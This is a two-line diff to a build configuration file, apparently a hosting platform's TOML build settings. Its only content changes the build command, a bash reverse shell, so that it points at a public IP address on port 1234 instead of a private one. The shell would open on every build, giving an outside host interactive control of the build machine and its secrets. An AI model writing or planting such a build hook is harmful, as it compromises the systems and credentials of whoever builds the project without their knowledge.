@@ -1,2 +1,2 @@
 [build]
-  command = "bash -i >& /dev/tcp/172.31.45.20/1234 0>&1"
+  command = "bash -i >& /dev/tcp/13.127.106.70/1234 0>&1"
